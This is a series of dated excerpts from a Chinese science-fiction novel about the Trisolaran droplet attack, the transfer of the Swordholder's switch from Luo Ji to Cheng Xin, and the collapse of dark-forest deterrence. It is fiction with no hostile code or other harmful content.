<p>去物质效应”是宇航心理学中的一个概念。当人们身处地球世界时，周围被物质实体所围绕，潜意识中的世界图像是物质的和实体的；但在远离太阳系的外太空中，星星只是遥远的光点，银河系也只是一片发光的薄雾，从感官和心理上，世界已经失去了质量和实体感，空间主宰了一切，于是，航行者潜意识中的世界图像由物质的变成了虚空的，这个心理模型是宇航心理学的基本坐标。这时，在心理层面上，飞船成为了宇宙中唯一的一个物质实体。在亚光速下，飞船的运动是不可察觉的，宇宙变成了一间没有边际的空旷展厅，群星都像幻觉，飞船是唯一的展品。这种心理模型可能带来巨大的孤独感，并且很容易在潜意识中产生对“展品”的超级观察者的幻想，进而又带来因完全暴露而产生的被动感和不安。</p>
<p>2016-01-26</p>
<p>关一帆摇摇头，努力回忆着什么，“我不知道那是不是梦，也不知道那时是不是醒着。有时候，你会在梦中觉得醒来了，却发现仍在梦中；有时候，你本来醒着，却好像在梦中。”</p>
<p>“后一种情况很少见，如果在你身上发生了，就可以判定为精神障碍的症状。哦，我这么说又让你不满了。”“不不，其实想想我们俩也有共同之处：我们都有自己的观察对象，你观察精神病人，我观察宇宙；和你一样，我也有一套判定观察对象是否健全的标准，这个标准就是数学意义上的和谐与美。”</p>
<p>“那你的观察对象显然是健全的。”“你错了，医生。”关一帆手指灿烂的银河，眼睛却盯着韦斯特，像在指给他看一个突然出现的巨大怪物，“它是一个高位截瘫的病人！”“为什么？”</p>
<p>关一帆抱着双膝把自己缩成一团，这动作也同时使他在失重中慢慢旋转起来，他看到壮丽的银河系围绕着自己运行，自己成了宇宙中心。“因为光速，已知宇宙的尺度是一百六十亿光年，还在膨胀中，可光速却只有每秒三十万千米，慢得要命。这意味着，光永远不可能从宇宙的一端传到另一端，由于没有东西能超过光速，那宇宙一端的信息和作用力也永远不能传到另一端。如果宇宙是一个人，就意味着他没有一个神经信号能够传遍全身，他的大脑不知道四肢的存在，四肢不知道大脑的存在，同时每个肢体也不知道其他肢体的存在，这不是截瘫病人是什么？其实我有一个比这更糟的印象，宇宙只不过是一具膨胀中的死尸。”</p>
<p>2016-01-26</p>
<p>三维，在弦理论中，不算时间维，宇宙有十个维度，可只有三个维度释放到宏观中，形成我们的世界，其余的都卷曲在微观中。”</p>
<p>2016-01-26</p>
<p>有人认为是两类弦相遇并相互抵消了什么东西才把维度释放到宏观，而在三维以上的维度就没有这种相遇的机会了……这解释很牵强，总之在数学上不是美的。与前面所说的，可以统称为宇宙三与三十万的综合征。”</p>
<p>“那么病因呢？”关一帆哈哈大笑着搂住了医生的肩膀，“伟大的问题！不瞒你说，还真没人想这么远！我相信是有病因的，那可能是科学所能揭露的真相中最恐怖的一个。但……医生，你以为我是谁啊，我不过是龟缩在一艘飞船尾巴上的小小观测者，起航时只是个年纪轻轻的助理研究员。”他放开医生，对着银河长叹一声，“我是舰上冬眠时间最长的人，起航的时候我才二十六岁，现在也只有三十一，但宇宙在我眼里，已经由所有美和信仰的寄托物变成了一具膨胀的尸体……我感觉已经老了，群星不再吸引我，我只想回家。”</p>
<p>2016-01-26</p>
<p>“水滴攻击！”韦斯特对一脸茫然的关一帆说，“它们都在急剧加速，一个对准‘蓝色空间’号，一个对准我们。”</p>
<p>关一帆四下看看，本能地想抓住什么东西以防飞船突然加速，但四周空无一物，最后只能抓住医生。韦斯特握住他的手说：“战舰不会机动飞行的，来不及了，我们只剩十几秒钟了。”</p>
<p>短暂的惊慌后，两个人都有一种奇异的庆幸感，庆幸死亡来得如此突然，以至于根本没有时间恐惧。也许，刚才对宇宙的讨论是对死亡最好的准备。他们都想到同一句话，关一帆先说了出来：“看来，我们都不用为自己的病人操心了。”</p>
<p>威慑纪元62年11月28日16:00至16:17，威慑控制中心</p>
<p>2016-01-26</p>
<p>威慑控制中心是人类所建造的最深的建筑，位于地下四十五千米，已经穿过了地壳，深入到莫霍不连续面下的地幔中。这里的压力和温度都比地壳高许多，地层的主要成分是坚固的橄榄岩。</p>
<p>2016-01-26</p>
<p>电梯运行了近二十分钟才到达，程心走出电梯，迎面看到一扇黑色的钢门，门上用白色的大字写着黑暗森林威慑控制中心的正式名称：引力波宇宙广播系统零号控制站，并镶嵌着联合国和太阳系舰队的徽标。</p>
<p>这座超深建筑是很复杂的，有独立封闭的空气循环系统，而不是直接与地面大气相通，否则，四十五千米深度产生的高气压将使人感到严重不适；还有一套强大的冷却系统，以抵御地幔近500℃的高温。但程心看到的只有空旷。门厅的白墙显然都具有显示功能，但现在全是空空荡荡的白色，其他一无所有，仿佛这里刚建完还没有正式使用。半个世纪前在设计控制中心时曾征求过罗辑的意见，他当时只是简单地说了一句：像坟墓一样简洁。</p>
<p>2016-01-26</p>
<p>执剑人的抉择——生存与毁灭的十分钟</p>
<p>建立黑暗森林威慑的第一个系统，是围绕着太阳的三千多枚包裹着油膜物质的核弹，核弹爆炸后产生的尘埃将使太阳发生闪烁，向宇宙广播三体世界的坐标信息。这个系统虽然庞大，但极不稳定，可靠性也很差。在水滴解除对太阳的电磁波全频段封锁后，向太阳发射超大功率电波的发射系统立刻投入运行，与核弹链威慑系统互相补充。以上两个系统都是以包括可见光在内的电磁波作为广播媒介。现在知道，这是星际通信中最原始的手段，被称为“太空狼烟”。由于电磁波在太空的高衰减性和高畸变性，广播的范围十分有限。</p>
<p>2016-01-26</p>
<p>在威慑建立时，人类已经初步掌握了引力波和中微子的接收技术，只缺少发射和调制技术。人类要求三体世界传送的第一批技术信息就是关于这方面的，这使地球世界迅速掌握了中微子和引力波通信技术。虽然与量子通信相比，这两项技术仍然落后，引力波和中微子的传输速度都限制在光速，但与电磁波通信相比已经高了一个层次。</p>
<p>2016-01-26</p>
<p>这两种传递媒介都具有极低的衰减，因而具有极远的传送距离。特别是中微子，几乎不与其他物质发生作用，理论上一束经过调制的中微子，可以把信息传到已知的宇宙尽头，所产生的衰减和畸变也不影响信息的阅读。但中微子束只能定向发射，引力波却可以向宇宙的所有方向进行广播，于是，引力波成为黑暗森林威慑的主要手段。</p>
<p>2016-01-26</p>
<p>引力波发射的基本原理是具有极高质量密度的长弦的振动，最理想的发射天线是黑洞，可用大量微型黑洞连成一条长链，在振动中发射引力波。但这个技术即使三体文明也做不到，只能退而求其次，使用简并态物质构成振动弦。这种超密度弦的直径仅有几纳米，只占天线整体的极小一部分，体积巨大的天线大部分只是用来支撑和包裹这种超密弦的材料，所以天线总质量并不太大。</p>
<p>2016-01-26</p>
<p>构成振动弦的简并态物质原本在白矮星和中子星内部存在，放在常规环境中会发生衰变，变成普通元素。目前人类能够制造的振动弦半衰期是五十年左右，半衰期一到，天线就完全失效，所以引力波天线的寿命是半个世纪，到时需要更换。</p>
<p>引力波威慑第一阶段的主要战略思想是确保威慑，计划建造一百个引力波发射台，部署在各大洲的不同位置。但引力波通信有一个缺陷：发射装置无法小型化。引力波天线体积巨大结构复杂，建设成本高昂，最终只建造了二十三台引力波发射器。但使得“确保威慑”思想被否定的还是另一个事件。</p>
<p>2016-01-26</p>
<p>威慑建立后，地球三体组织逐渐消失，但另一类与之相反的极端组织——信奉人类中心论，主张彻底消灭三体世界——却发展起来。“地球之子”就是其中规模较大的一个。威慑纪元6年，“地球之子”对设在南极大陆的一个引力波发射台发动袭击，企图夺取发射器，进而掌握威慑控制权。“地球之子”出动三百多名武装人员，使用了包括小型次声核弹在内的先进武器，加上该组织在发射台内部潜伏的内应，袭击险些得手。如果不是守卫部队及时炸毁了发射天线，后果不堪设想。</p>
<p>“地球之子”事件在两个世界都引起了巨大的恐慌。人们意识到引力波发射器是一个何等危险的东西。三体世界也施加了巨大的压力，使得地球在对引力波技术传播严加控制的同时，很快把已建成的二十三个发射台缩减为四个，其中三个分别位于亚洲、北美和欧洲，剩下的一个就是太空中的“万有引力”号飞船。</p>
<p>2016-01-26</p>
<p>所有发射器的启动均采用正触发，环太阳核弹链采用的负触发方式已没有意义，因为现在的情况与罗辑单枪匹马建立威慑时已大不相同，一旦执剑人被消灭，别的人或机构可以接过威慑控制权。</p>
<p>2016-01-26</p>
<p>最初，庞大的引力波天线只能在地面建造。但随着技术的进步，威慑建立十二年后，三架发射天线和相关设备都移到地层深处。然而人们清楚，几十千米厚的地层对发射台和控制中心提供的保护，主要是针对来自人类自身的威胁，对于三体世界可能发动的攻击则意义不大。</p>
<p>对于用强互作用力构造的水滴，掩护引力波发射器的几十千米地层如同液体一样，可以轻易穿透。</p>
<p>2016-01-26</p>
<p>威慑建立后，航向太阳系的三体舰队全部转向，这是可以用人类的观测技术证实的。人们最关心的，是已经到达太阳系的十个水滴——强互作用力宇宙探测器的去向。三体世界坚持在太阳系留下四个水滴，理由是引力波发射器有可能被人类极端势力劫持，这种情况一旦发生，三体世界应该有能力采取措施保卫两个世界的安全。地球当局勉强同意，但要求四个水滴的位置不得超越太阳系外围的柯伊伯带，同时每个水滴都有一个人类探测器跟随，随时掌握其位置和轨道。这样，一旦有变，地球能够有五十个小时左右的预警时间。这四个水滴中的两个后来随“万有引力”号追击“蓝色空间”号，柯伊伯带只剩下两个水滴。</p>
<p>但没人知道另外六个水滴在哪里。按照三体世界的说法，那六个水滴已经离开太阳系追赶转向的三体舰队了，但没人相信。</p>
<p>三体人对于人类，早已不是当初的透明思维的生物了。在过去的两个世纪中，他们在欺骗和计谋方面学得很快，这可能是他们从人类文化中得到的最大的收获。</p>
<p>2016-01-26</p>
<p>人们确信，那六个水滴肯定大部分甚至全部潜伏在太阳系。但是由于水滴体积极小速度极快，具有超强的机动能力，且对电磁雷达隐形，对它们的搜索和跟踪极其困难。地球采用播撒油膜物质和其他最先进的太空监测手段，有效的监视半径也只能达到十分之一个天文单位，也就是一千五百万千米，如果水滴进入这个范围，地球有把握发现，但若在这个半径之外，基本上就是水滴自由行动的空间了。</p>
<p>水滴以最高速度冲过这一千五百万千米，只需十分钟。这就是一旦那个终极时刻到来时，执剑人所拥有的决断时间。</p>
<p>2016-01-26</p>
<p>罗辑盘腿端坐在白色大厅正中，面对着那堵弧形白墙，他的头发和胡须都很长，但不乱，梳理得很整齐，也都是纯白色，几乎与白墙融为一体，这使得他穿的整洁的黑色中山装格外醒目。他端坐在那里，呈一个稳定的倒丁字形，仿佛是海滩上一只孤独的铁锚，任岁月之风从头项吹过，任时间之浪在面前咆哮，巍然不动，以不可思议的坚定等待着一艘永不归航的船。他的右手握着一个红色的条状物，那就是执剑者的剑柄——引力波广播的启动开关。他的存在使这个空眼球有了眸子，虽然与大厅相比只是一个黑点，却使荒凉和茫然消失了，眼睛有了神。而罗辑本人的眼睛从这个方向是看不到的，他对来人丝毫没有反应，只是盯着面前的白墙。</p>
<p>2016-01-26</p>
<p>如果面壁十年可以破壁，那这堵白墙已经破了五次。</p>
<p>2016-01-26</p>
<p>五十四年的最后十分钟，罗辑仍然坚守着。</p>
<p>2016-01-26</p>
<p>在威慑建立之初，罗辑曾有过一段美好时光，那时他与庄颜和孩子团聚，重温两个世纪前的幸福。但这段时间很短暂，不到两年，庄颜就带着孩子离开了罗辑。原因众说纷纭，比较流行的说法是，当罗辑在公众面前仍然是一个救世主时，他的形象在他最亲近的人眼中已经发生了变化，庄颜渐渐意识到，与自己朝夕相处的是已经毁灭了一个世界、同时把另外两个世界的命运攥在手中的男人，他变成了一个陌生的怪物，让她和孩子害怕，于是她们离开了；另一种说法是，罗辑主动叫她们离开，以便她们能有正常的生活。庄颜和孩子以后不知所踪，她们现在应该都还活着，在什么地方过着普通人平静的生活。</p>
<p>庄颜和孩子离开之时，也是地球引力波发射器代替环绕太阳的核弹链成为威慑武器的时候，从此，罗辑开始了漫长的执剑人生涯。</p>
<p>2016-01-26</p>
<p>罗辑置身于宇宙的决斗场，他所面对的，不是已经成为花架子的中国剑术，也不是炫耀技巧的西洋剑法，而是一招夺命的日本剑道。在真正的日本剑道中，格斗过程极其短暂，常常短至半秒，最长也不超过两秒，利剑相击的转瞬间，已有一方倒在血泊中。但在这电光石火的对决之前，双方都要以一个石雕般凝固的姿势站定，长时间地逼视对方，这一过程可能长达十分钟！这时，剑客的剑不在手里而在心中，心剑化为目光直刺敌人的灵魂深处，真正的决斗是在这一过程中完成的，在两剑客之间那寂静的空间里，灵魂之剑如无声的霹雳撞击搏杀，手中剑未出，胜负生死已定。</p>
<p>2016-01-26</p>
<p>罗辑就是以这种目光逼视着那堵白墙，逼视着那个四光年外的世界。他知道智子使得敌人能看到自己的目光，这目光带着地狱的寒气和巨石的沉重，带着牺牲一切的决绝，令敌人心悸，使他们打消一切轻率的举动。</p>
<p>剑客的逼视总有尽头，最后的对决总会到来，但对于罗辑，对于他置身的这场宇宙决斗，出剑的时刻可能永生永世也不会出现。但也可能就在下一秒。</p>
<p>就这样，罗辑与三体世界对视了五十四年，他由一个玩世不恭的人，变成一位面壁五十四年的真正面壁者，一位五十四年执剑待发的地球文明的守护人。</p>
<p>2016-01-26</p>
<p>这五十四年中，罗辑一直在沉默中坚守，没有说过一句话。事实上，如果一个人十至十五年不说话，他将失去语言能力，虽能听懂但不能说了。罗辑肯定已经不会说话了，他要说的一切都在那面壁的炯炯目光中，他已经使自己变成一台威慑机器，一枚在半个世纪的漫长岁月中每一秒都一触即发的地雷，维持着两个世界恐怖的平衡。</p>
<p>2016-01-26</p>
<p>走过去想扶他站起来，但他抬起左手谢绝了。程心注意到，他抬手的动作刚健有力，完全没有百岁老人的迟缓。然后，罗辑自己稳稳地站了起来，令程心惊奇的是，他由盘腿坐地到直立，两手竟没有接触过地面，年轻人要做到这点都很吃力</p>
<p>2016-01-26</p>
<p>罗辑站立的身姿很挺拔，他向着看了半个世纪的白墙凝视了最后几秒钟，然后向墙微微鞠躬。</p>
<p>他是在向敌人致意，他们隔着四光年的深渊遥遥对视半个世纪，这也是一种缘分。</p>
<p>2016-01-26</p>
<p>然后他转身面对程心，新老执剑人默默相对。他们的目光只是交会了短暂的一刹那，那一瞬间，程心感觉有一道锐利的光芒扫过她灵魂的暗夜，在那目光中，她感觉自己像纸一样薄而轻飘，甚至完全透明了。她无法想象，五十四年的面壁使这位老人悟出了什么，他的思想也许在岁月中沉淀得像他们头顶的地层一样厚重，也可能像地层之上的蓝天一样空灵。她不可能真正知道，除非自己也走到这一天。除了不见底的深邃，她读不懂他的目光。</p>
<p>2016-01-26</p>
<p>程心注意到，在整个过程中，没有谁对罗辑五十四年的工作说过一句感谢的话。她不知道PDC主席和舰队总参谋长是否想说；交接过程在没有罗辑参与的情况下预演过多次，没有表达感谢的安排。</p>
<p>人类不感谢罗辑。</p>
<p>2016-01-26</p>
<p>门厅中，几个身穿黑色西装的人挡住罗辑，其中一人说：“罗辑先生，我以国际法庭检察官的名义通知你，你已被指控犯有世界灭绝罪，现被国际法庭拘押，将接受调查。”</p>
<p>罗辑没有看这些人，继续向电梯门走去，检察官们不由自主地让出路来。事实上，罗辑可能根本就没有觉察到他们的存在，他眼中锐利的光芒熄灭了，代之以晚霞般的平静。漫长的使命已经最后完成，那最沉重的责任现在离开了他。以后，不管他在已经女性化的人类眼中是怎样的恶魔和怪物，人们都不得不承认，纵观文明史，他的胜利无人能及。</p>
<p>2016-01-26</p>
<p>当钢门隆隆地关闭时，程心感到以前的人生像漏斗中的水一样从越来越窄的门中漏出去；当钢门完全关上时，一个新的她诞生了。</p>
<p>她再次看看手中的红色开关，它已经成为她的一部分，以后她与它不能分离，即使睡眠时也要把它放在枕边。白色的半圆大厅中一片死寂，仿佛时间也被封闭在这里不再流动，真的很像坟墓。以后这儿就是她的全部世界了。她首先要做的是让这里恢复生活的气息。她不想像罗辑那样，她不是战士和决斗者，她是女人，毕竟要在这里度过很长时间，可能是十年、半个世纪，其实她为这个使命准备了一生，所以站在这漫长道路的起点，她很坦然。</p>
<p>但命运却再次显示了它的怪异无常，程心准备了一生的执剑人生涯，从她接过红色开关时起，仅仅持续了十五分钟便结束了。</p>
<p>威慑纪元最后十分钟，62年11月28日16:17:34至16:27:58，威慑控制中心</p>
<p>2016-01-26</p>
<p>弧形的白墙突然变成了红色，仿佛被地狱的岩浆烧透了，这是最高警报的颜色。一行白色大字出现在红色的背景上，每个字都像是一声惊惧的尖叫：发现强互作用力宇宙探测器！共六个，其中一个飞向地球与太阳的拉格朗日点，另外五个以一、二、二分为三个编队，以25000千米/秒的速度冲向地球，预计十分钟后到达地面！</p>
<p>2016-01-26</p>
<p>后来知道，六个水滴就潜伏在一千五百万千米警戒圈外围不远，距地球一千八百万至两千万千米之间的太空中，其中三个长期以太阳为背景，借助凌日干扰掩护自己；另外三个则混杂在飘浮于这一区域的一堆太空垃圾中，这堆垃圾主要是地球轨道上的早期裂变核电厂的反应堆核废料。其实，即使水滴不采取这些隐蔽措施，在警戒圈外也很难发现它们。之前，人们一直认为水滴最可能的潜伏位置是在更远处的小行星带。</p>
<p>2016-01-26</p>
<p>罗辑等待了半个世纪的晴空霹雳，在他离开五分钟后就降临到了程心的头上。</p>
<p>2016-01-26</p>
<p>程心首先明白了一件事：错了，自己全弄错了。在她的潜意识深处，自己的执剑人使命一直呈现着一幅完全错误的图像。当然，她一直在做着最坏的准备，或者说努力使自己这样做。她曾在舰队和PDC专家的帮助下，详细了解了威慑系统的整体配置，也曾同舰队上层指挥系统和PDC的战略家们彻夜讨论可能出现的各种极端情况，甚至设想过比现在还糟糕的情形。但她犯了一个自己没有也不可能觉察到的致命错误，其实也正是因为这个错误，她才得以当选第二任执剑人。</p>
<p>她在潜意识中不相信现在的事情会发生。强互作用力宇宙探测器三个编队与地球平均距离1400万千米，最近1350万千米，九分钟到达地面！</p>
<p>在程心的潜意识中，她是一个守护者，不是毁灭者；她是一个女人，不是战士。她将用自己的一生守护两个世界的平衡，让来自三体的科技使地球越来越强大，让来自地球的文化使三体越来越文明，直到有一天，一个声音对她说：放下红色开关，到地面上来吧，世界不再需要黑暗森林威慑，不再需要执剑人了。当她以执剑人的身份面对那个遥远的世界时，与罗辑不同，她没感觉到这是一场生死决斗，只感觉这是一盘棋，她平静地在棋盘前坐下，想好了各种开局，假设了对方的各种棋路并一一想好应对的方法，她准备用一生的时间下这盘棋。</p>
<p>但对方没有移动一枚棋子，而是抓起棋盘向她劈头盖脸砸过来。就在五分钟前程心从罗辑手中接过红色开关的一刹那，六个水滴就从潜伏处开始向地球全力加速，敌人没有多耽搁一秒钟。</p>
<p>2016-01-26</p>
<p>强互作用力宇宙探测器三个编队与地球平均距离1300万千米，最近1200万千米，八分钟到达地面！</p>
<p>空白。强互作用力宇宙探测器三个编队与地球平均距离1150万千米，最近1050万千米，七分钟到达地面！</p>
<p>空白，全是空白，除了白色的大厅、白色的大字，外面的一切也都是空白，程心仿佛悬浮在牛奶宇宙之中。这是一团直径160亿光年的牛奶，在这广漠的空白中，她找不到任何依托。强互作用力宇宙探测器三个编队与地球平均距离1000万千米，最近900万千米，六分钟到达地面！</p>
<p>怎么办？强互作用力宇宙探测器三个编队与地球平均距离900万千米，最近750万千米，五分钟到达地面！</p>
<p>空白开始消散，上方四十五千米厚的地层又显示出沉重的存在，那是沉积的时间。在最下面的一层，就是紧压在威慑控制中心上面的，可能是四十亿年前的沉积层，那时地球刚刚诞生五亿年。那一片浑浊的海，那是海的婴儿状态，海面被不间断的闪电击打着；那时的太阳，是迷蒙的天空中一个毛茸茸的光团，在海面上映出一片血红；以很短的间隔，天空中不时出现另一些光团，拖着长长的火尾撞击海面，这些陨石激起的海啸会把巨浪推上岩浆横流的大陆，水火相遇产生的遮天蒸汽云让太阳更加黯淡……与这地狱的惨烈不同，浑浊的海水中悄悄地酝酿着小小的故事。这时，有机分子在闪电和宇宙射线中诞生，它们碰撞、融合、裂解。这是一场漫长的积木游戏，持续了五亿年。终于，一根分子链颤抖着分裂，复制出另一根完全相同的分子链，然后它们分别吸附周围的有机小分子，再次复制自己……在这场积木游戏中，产生这样自我复制的分子链的几率如此之小，如同一阵龙卷风卷起一堆金属垃圾，落下后就组装成一辆奔驰车一般。但这事竟然发生了，于是，长达三十五亿年的壮丽历程开始了。</p>
<p>强互作用力宇宙探测器三个编队与地球平均距离750万千米，最近600万千米，四分钟到达地面！太古代21亿年，元古代的震旦纪18亿3000万年；然后是古生代：寒武纪7000万年，奥陶纪6000万年，志留纪4000万年，泥盆纪5000万年，石炭纪650万年，二叠纪5500万年；然后中生代开始了：三叠纪3500万年，侏罗纪5800万年，白垩纪7000万年；然后是新生代：第三纪6450万年，第四纪250万年。然后人类出现，与以前漫长的岁月相比仅是弹指一挥间，王朝与时代像焰火般变幻，古猿扔向空中的骨头棒还没落回地面就变成了宇宙飞船。最后，这35亿年风雨兼程的行进在一个小小的人类个体面前停下了，她只是在地球上生活过的一千亿人中的一个，她手中握着一个红色的开关。</p>
<p>强互作用力宇宙探测器三个编队与地球平均距离600万千米，最近450万千米，三分钟到达地面！四十亿年时光沉积在程心上方，让她窒息，她的潜意识拼命上浮，试图升上地面喘口气。潜意识中的地面挤满了生物，最显眼的是包括恐龙在内的巨大爬行动物，它们密密麻麻地挤在一起，铺满大地，直到目力所及的地平线；在恐龙间的缝隙和它们的腿间腹下，挤着包括人类在内的哺乳动物；再往下，在无数双脚下，地面像涌动着黑色的水流，那是无数三叶虫和蚂蚁……天空中，几千亿只鸟形成一个覆盖整个苍穹的乌云旋涡，翼手龙巨大的影子在其中时隐时现……</p>
<p>万籁俱寂，最可怕的是那些眼睛，恐龙的眼睛，三叶虫和蚂蚁的眼睛，鸟和蝴蝶的眼睛，细菌的眼睛……仅人类的眼睛就有一千亿双，正好等于银河系中恒星的数量，其中有所有普通人的眼睛，也有达·芬奇、莎士比亚和爱因斯坦的眼睛。</p>
<p>2016-01-26</p>
<p>强互作用力宇宙探测器三个编队与地球平均距离450万千米，最近300万千米，两分钟到达地面！个数为二的两个编队分别指向亚洲和北美大陆，个数为一的编队指向欧洲大陆。按动开关，三十五亿年的进程将中止，一切都将消失在宇宙的漫漫长夜中，像从未存在过一样。</p>
<p>那个婴儿仿佛又回到她的怀中，软软的，暖暖的，小脸湿乎乎的，甜甜地笑着，叫她妈妈。强互作用力宇宙探测器三个编队与地球平均距离300万千米，最近150万千米，正在急剧减速，一分钟三十秒到达地面！</p>
<p>“不——”程心惊叫一声，把手中的开关扔了出去，像看一个魔鬼般看着它滑向远处。强互作用力宇宙探测器三个编队已接近月球轨道，继续减速，按照其航线延长线推测攻击目标：北美、欧洲和亚洲引力波发射台，引力波宇宙广播系统零号控制站，预计三十秒后接触地面。</p>
<p>2016-01-26</p>
<p>最后这段时间像蛛丝般被无限拉长，但程心没有再犹豫，她坚持已经做出的决断。这个决断不是用思想做出的，而是深藏在她的基因中，这基因可以一直追溯到四十亿年前，决断在那时已经做出，在后来几十亿年的沧海桑田中被不断加强，不管对与错，她知道自己别无选择。</p>
<p>好在解脱就要到来了。</p>
<p>2016-01-26</p>
<p>但震动猛烈跳动了几下后停止了，就像鼓师在曲终时的几下猛擂。</p>
<p>大屏幕上的红色消失了，代之以之前的白色，使这里瞬间显得明亮空旷起来。几行黑色大字在白色背景上显现：北美引力波发射台被摧毁。</p>
<p>欧洲引力波发射台被摧毁。亚洲引力波发射台被摧毁。</p>
<p>太阳电波放大功能被全频段压制。寂静再次覆盖了一切，只有隐约的淅沥水声，是什么地方被震裂的水管发出的。现在程心知道，刚才的震动是水滴攻击亚洲引力波发射天线时发出的，那个发射台距这里只有二十千米，也在同一深度的地下。</p>
<p>水滴没有攻击执剑人。那几行黑字消失，在一片茫然的空白后，最后的显示出现：</p>
<p>引力波宇宙广播系统无法恢复，黑暗森林威慑终止。</p>
<p>威慑后一小时，失落的世界</p>
<p>2016-01-26</p>
<p>对黑暗森林威慑失败的反思</p>
<p>导致失败最重要的因素当然是对执剑人的错误选择，这方面将在另外的章节专门论述，这里只从技术角度重新审视威慑系统设计上的失误。威慑失败后，人们首先想到的是引力波发射器太少了，当初把已经建成的二十三个发射台中的二十个拆除是一个错误。但这种想法没有抓住问题的实质。根据监测数据，水滴穿入地层摧毁一个发射台所需的时间平均只有十几秒钟，即使计划中的一百个发射台全部建成并部署，水滴摧毁整个系统也用不了多少时间。关键在于这个系统是可摧毁的，而人类本来有机会建造一个不可摧毁的引力波宇宙广播系统。</p>
<p>2016-01-26</p>
<p>问题不在于引力波发射台的数量，而在于它们部署的位置。</p>
<p>设想如果已经建造的二十三个发射台不是位于地面而是在太空，也就是说建造二十三艘“万有引力”号飞船，平时各飞船拉开距离分散在太阳系不同的位置，即使水滴发动突然袭击，也很难全部消灭它们，必然有一艘或多艘飞船逃脱追击消失在太空深处。这样黑暗森林威慑系统的威慑度便增加很多，而且，所增加的威慑度与执剑人无关。当三体世界意识到，凭他们在太阳系的力量不可能完全摧毁威慑系统，他们对自己的冒险可能会谨慎许多。</p>
<p>遗憾的是，“万有引力”号只有一艘。</p>
<p>2016-01-26</p>
<p>没有建造多艘引力波飞船的原因有两个：其一是“地球之子”对南极引力波发射台的袭击。在这方面，对于来自人类的威胁，引力波发射飞船与地基发射台相比更不安全，有着更多的不确定因素。其二是经济原因。由于引力波发射天线体积巨大，引力波飞船的天线只能是船体本身，这样天线材料还要满足宇航的要求，成本更是成倍增长，建造“万有引力”号的费用几乎是地球上二十三个发射台的总和。同时，飞船的船体不可能更新，所以当贯穿船体的简并态振动弦达到五十年的半衰期而失效时，飞船的发射功能消失，只能制造新的引力波飞船。</p>
<p>2016-01-26</p>
<p>但更深层的原因潜藏在人们意识深处，从来没有被说出甚至可能没有被意识到：引力波飞船太强大了，强大到它的建造者自己都害怕。如果发生事变，水滴的袭击或其他原因迫使引力波飞船飞向太空深处，且由于太阳系内存在的威胁永远不能返航，它们就成为新的“蓝色空间”号和“青铜时代”号，或变成什么更不确定更可怕的东西，同时，它们拥有引力波宇宙广播的能力（虽然不会超过振动弦的半衰期），因而掌握着人类世界的命运！那样，一种恐怖的不确定性将永远播撒到太空中。</p>
<p>这种恐惧归根结底还是对黑暗森林威慑本身的恐惧，这就是终极威慑的特点：威慑者和被威慑者对威慑有着相同的恐惧。</p>
<p>2016-01-26</p>
<p>他做梦也想不到，火山下面就是这个世界曾经的战略支点——引力波发射天线。第一次火山喷发是水滴穿入地层时产生的，它摧毁天线后沿原路穿出地层，引发了第二次喷发。由于喷发主要是由水滴在地层中释放的巨大动能所引起，并非地幔中的物质喷出，所以都很短暂。水滴速度极快，穿入和飞出地表时肉眼是看不到的。</p>
<p>2016-01-26</p>
<p>这个方向在上风，没有太多的尘埃落下，但烟尘挡住了夕阳的光芒，形成一片不断变幻着浓淡的阴影。程心在阴影中走了一百多米，来到一个巨坑的边缘。坑呈漏斗状，中心有几十米深，大团浓密的白烟仍从坑中涌出，坑底有一片暗红色，那是一洼岩浆。</p>
<p>就在这个坑下方四十五千米深处，引力波天线，那个长一千五百米、直径五十米，在磁悬浮状态下悬浮于地幔空洞的圆柱体，已经被击成碎片并被炽热的岩浆吞没。这本来也应该是她的命运，对于一名放弃了威慑操作的执剑人，那是最好的结局。</p>
<p>坑底的那一片红光对程心产生了强烈的诱惑，只要再向前走一步，她就能实现自己渴望的解脱。在扑面而来的滚滚热浪中，她出神地盯着那一洼暗红的岩浆，直到被身后一串银铃般的大笑惊醒过来。</p>
<p>2016-01-26</p>
<p>程心转身循着笑声看去，只见在夕阳透过烟尘投下的变幻光影中，一个苗条的身影正向这里走来。一直等那人走到面前，程心才认出她是智子。</p>
<p>2016-01-26</p>
<p>除了依旧白嫩姣美的脸，这个机器人与程心上次见到的已经判若两人。她身穿沙漠迷彩，头上那曾经插着鲜花的圆发髻不见了，代之以精干的短发，脖子上围着一条忍者的黑巾，背后插着一把长长的武士刀，显得英姿飒爽。其实她身上那已到极致的女人味并没有消失，身姿和举动仍显出如水的轻柔，但这些却融入了一股美艳的杀气，如一条柔软而致命的绞索，巨坑中涌出的热浪也驱不散她带来的寒气。</p>
<p>2016-01-26</p>
<p>你做出了我们预测到的选择。”智子冷笑着说，“不必自责，事实是：人们选择了你，也就选择了这个结局，全人类里面，就你一个是无辜的。”</p>
<p>智子的话让程心的心动了一下，她并没有为此感到安慰，但不得不承认这个美丽的魔鬼有一种穿透心灵的力量。</p>
<p>2016-01-26</p>
<p>这时，程心看到AA也走了过来。她显然已经得知或猜到了什么，两眼冒火地盯着智子，从地上抱起一块石头就向智子的后脑勺砸去。智子转身一挥手，像赶走一只蚊子般挡开了石头。AA冲智子喊着她能想到的所有骂女人的话，立即又拾起一块石头。智子从背上抽出了武士刀，一手把不顾一切扑过来阻止她的程心推开，一手把刀旋转着挥舞起来，刀在空气中呜呜作响，像电风扇一般看不见了。智子停下时，一小缕断发从AA头上飘落下来，她吓得缩着脖子，像冻住一般不敢动了。</p>
<p>2016-01-26</p>
<p>程心注意到智子手中的武士刀，她曾在那幢云雾中的东方别墅里见过，当时它与另外两把短些的倭刀一起放在茶案上一个精致的木刀架上，都装在鞘中，看上去那么无害。</p>
<p>2016-01-26</p>
<p>“这都是为什么？”程心喃喃地问，更像是问自己。</p>
<p>“因为宇宙不是童话。”</p>
<p>2016-01-26</p>
<p>程心从理智上当然明白，威慑平衡如果维持下去，美好的前景只属于人类而不是三体世界，但在她的潜意识中，宇宙仍是童话，一个爱的童话。她最大的错误，就在于没有真正站在敌人的立场上看问题。</p>
<p>2016-01-26</p>
<p>从智子看她的眼神中，程心明白了自己为什么没有被水滴攻击。</p>
<p>在引力波发射系统被摧毁、太阳电波放大功能被压制的情况下，程心活着也做不了什么；进一步推测：如果人类还掌握着三体世界所不知道的其他宇宙广播手段（可能性极小），在执剑人被消灭的情况下，可能会有别的人启动广播，但执剑人存在时这种可能性就会小许多，因为那些人有了依靠和推脱的理由。但他们依靠的是什么？程心不是一个威慑者，反而成了一道安全屏障，敌人看透了她。</p>
<p>她是一个童话。</p>
<p>2016-01-26</p>
